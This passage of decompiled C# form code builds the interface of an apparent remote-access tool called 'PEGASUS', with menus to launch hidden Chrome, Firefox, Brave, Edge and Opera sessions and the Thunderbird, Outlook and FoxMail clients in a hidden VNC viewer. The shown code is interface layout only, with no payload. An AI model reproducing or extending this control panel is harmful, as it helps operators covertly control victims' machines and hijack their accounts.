			StophVNC.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			StophVNC.ForeColor = System.Drawing.Color.White;
			StophVNC.Image = (System.Drawing.Image)resources.GetObject("StophVNC.Image");
			StophVNC.Name = "StophVNC";
			StophVNC.Size = new System.Drawing.Size(219, 24);
			StophVNC.Text = "  Stop hVNC";
			StophVNC.Click += new System.EventHandler(StophVNC_Click);
			guna2ContextMenuStrip1.BackColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2ContextMenuStrip1.ImageScalingSize = new System.Drawing.Size(25, 25);
			guna2ContextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { test1ToolStripMenuItem, test2ToolStripMenuItem, braveToolStripMenuItem, edgeToolStripMenuItem, operaGXToolStripMenuItem });
			guna2ContextMenuStrip1.Name = "guna2ContextMenuStrip1";
			guna2ContextMenuStrip1.RenderStyle.ArrowColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip1.RenderStyle.BorderColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip1.RenderStyle.ColorTable = null;
			guna2ContextMenuStrip1.RenderStyle.RoundedEdges = true;
			guna2ContextMenuStrip1.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			guna2ContextMenuStrip1.RenderStyle.SelectionBackColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip1.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
			guna2ContextMenuStrip1.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			guna2ContextMenuStrip1.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			guna2ContextMenuStrip1.ShowImageMargin = false;
			guna2ContextMenuStrip1.Size = new System.Drawing.Size(216, 124);
			test1ToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			test1ToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			test1ToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("test1ToolStripMenuItem.Image");
			test1ToolStripMenuItem.Name = "test1ToolStripMenuItem";
			test1ToolStripMenuItem.Size = new System.Drawing.Size(215, 24);
			test1ToolStripMenuItem.Text = "  Hidden Chrome          ";
			test1ToolStripMenuItem.Click += new System.EventHandler(test1ToolStripMenuItem_Click);
			test2ToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			test2ToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			test2ToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("test2ToolStripMenuItem.Image");
			test2ToolStripMenuItem.Name = "test2ToolStripMenuItem";
			test2ToolStripMenuItem.Size = new System.Drawing.Size(215, 24);
			test2ToolStripMenuItem.Text = "  Hidden FireFox";
			test2ToolStripMenuItem.Click += new System.EventHandler(test2ToolStripMenuItem_Click);
			braveToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			braveToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			braveToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("braveToolStripMenuItem.Image");
			braveToolStripMenuItem.Name = "braveToolStripMenuItem";
			braveToolStripMenuItem.Size = new System.Drawing.Size(215, 24);
			braveToolStripMenuItem.Text = "  Hidden Brave";
			braveToolStripMenuItem.Click += new System.EventHandler(braveToolStripMenuItem_Click);
			edgeToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			edgeToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			edgeToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("edgeToolStripMenuItem.Image");
			edgeToolStripMenuItem.Name = "edgeToolStripMenuItem";
			edgeToolStripMenuItem.Size = new System.Drawing.Size(215, 24);
			edgeToolStripMenuItem.Text = "  Hidden Edge";
			edgeToolStripMenuItem.Click += new System.EventHandler(edgeToolStripMenuItem_Click);
			operaGXToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			operaGXToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			operaGXToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("operaGXToolStripMenuItem.Image");
			operaGXToolStripMenuItem.Name = "operaGXToolStripMenuItem";
			operaGXToolStripMenuItem.Size = new System.Drawing.Size(215, 24);
			operaGXToolStripMenuItem.Text = "  Hidden Opera";
			operaGXToolStripMenuItem.Click += new System.EventHandler(operaGXToolStripMenuItem_Click);
			guna2ContextMenuStrip3.BackColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip3.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			guna2ContextMenuStrip3.ImageScalingSize = new System.Drawing.Size(25, 25);
			guna2ContextMenuStrip3.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { thunderbirdToolStripMenuItem, outlookToolStripMenuItem, foxMailToolStripMenuItem });
			guna2ContextMenuStrip3.Name = "guna2ContextMenuStrip3";
			guna2ContextMenuStrip3.RenderStyle.ArrowColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip3.RenderStyle.BorderColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip3.RenderStyle.ColorTable = null;
			guna2ContextMenuStrip3.RenderStyle.RoundedEdges = true;
			guna2ContextMenuStrip3.RenderStyle.SelectionArrowColor = System.Drawing.Color.White;
			guna2ContextMenuStrip3.RenderStyle.SelectionBackColor = System.Drawing.Color.Black;
			guna2ContextMenuStrip3.RenderStyle.SelectionForeColor = System.Drawing.Color.White;
			guna2ContextMenuStrip3.RenderStyle.SeparatorColor = System.Drawing.Color.Gainsboro;
			guna2ContextMenuStrip3.RenderStyle.TextRenderingHint = System.Drawing.Text.TextRenderingHint.SystemDefault;
			guna2ContextMenuStrip3.ShowImageMargin = false;
			guna2ContextMenuStrip3.Size = new System.Drawing.Size(214, 76);
			thunderbirdToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			thunderbirdToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			thunderbirdToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("thunderbirdToolStripMenuItem.Image");
			thunderbirdToolStripMenuItem.Name = "thunderbirdToolStripMenuItem";
			thunderbirdToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			thunderbirdToolStripMenuItem.Text = "   Thunderbird               ";
			thunderbirdToolStripMenuItem.Click += new System.EventHandler(thunderbirdToolStripMenuItem_Click);
			outlookToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			outlookToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			outlookToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("outlookToolStripMenuItem.Image");
			outlookToolStripMenuItem.Name = "outlookToolStripMenuItem";
			outlookToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			outlookToolStripMenuItem.Text = "   Outlook";
			outlookToolStripMenuItem.Click += new System.EventHandler(outlookToolStripMenuItem_Click);
			foxMailToolStripMenuItem.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
			foxMailToolStripMenuItem.ForeColor = System.Drawing.Color.White;
			foxMailToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("foxMailToolStripMenuItem.Image");
			foxMailToolStripMenuItem.Name = "foxMailToolStripMenuItem";
			foxMailToolStripMenuItem.Size = new System.Drawing.Size(213, 24);
			foxMailToolStripMenuItem.Text = "   FoxMail";
			foxMailToolStripMenuItem.Click += new System.EventHandler(foxMailToolStripMenuItem_Click);
			VNCBox.BackColor = System.Drawing.Color.Black;
			VNCBox.BackgroundImage = (System.Drawing.Image)resources.GetObject("VNCBox.BackgroundImage");
			VNCBox.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
			VNCBox.Dock = System.Windows.Forms.DockStyle.Fill;
			VNCBox.ErrorImage = null;
			VNCBox.InitialImage = null;
			VNCBox.Location = new System.Drawing.Point(0, 44);
			VNCBox.Name = "VNCBox";
			VNCBox.Size = new System.Drawing.Size(1055, 763);
			VNCBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			VNCBox.TabIndex = 40;
			VNCBox.TabStop = false;
			VNCBox.MouseDown += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseDown);
			VNCBox.MouseEnter += new System.EventHandler(VNCBox_MouseEnter);
			VNCBox.MouseLeave += new System.EventHandler(VNCBox_MouseLeave);
			VNCBox.MouseHover += new System.EventHandler(VNCBox_MouseHover);
			VNCBox.MouseMove += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseMove);
			VNCBox.MouseUp += new System.Windows.Forms.MouseEventHandler(VNCBox_MouseUp);
			guna2HtmlToolTip1.AllowLinksHandling = true;
			guna2HtmlToolTip1.BackColor = System.Drawing.Color.Black;
			guna2HtmlToolTip1.BorderColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2HtmlToolTip1.ForeColor = System.Drawing.Color.White;
			guna2HtmlToolTip1.MaximumSize = new System.Drawing.Size(0, 0);
			guna2HtmlToolTip1.TitleFont = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			guna2HtmlToolTip1.TitleForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2HtmlToolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
			guna2HtmlToolTip1.ToolTipTitle = "PEGASUS";
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.Black;
			base.ClientSize = new System.Drawing.Size(1198, 845);
			base.Controls.Add(VNCBox);
			base.Controls.Add(panel4);
			base.Controls.Add(panel3);
			base.Controls.Add(guna2ResizeBox1);
			base.Controls.Add(panel1);
			DoubleBuffered = true;
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.MinimizeBox = false;
			MinimumSize = new System.Drawing.Size(1120, 681);
			base.Name = "FrmVNC";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(VNCForm_FormClosing);
			base.Load += new System.EventHandler(VNCForm_Load);
			base.Click += new System.EventHandler(VNCForm_Click);
			base.KeyPress += new System.Windows.Forms.KeyPressEventHandler(VNCForm_KeyPress);
			panel1.ResumeLayout(false);
			panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			statusStrip1.ResumeLayout(false);
			statusStrip1.PerformLayout();
			panel4.ResumeLayout(false);
			panel4.PerformLayout();
			guna2ContextMenuStrip2.ResumeLayout(false);
			guna2ContextMenuStrip1.ResumeLayout(false);
			guna2ContextMenuStrip3.ResumeLayout(false);
			((System.ComponentModel.ISupportInitialize)VNCBox).EndInit();
			ResumeLayout(false);
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void panel4_MouseDown(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}
	}
}
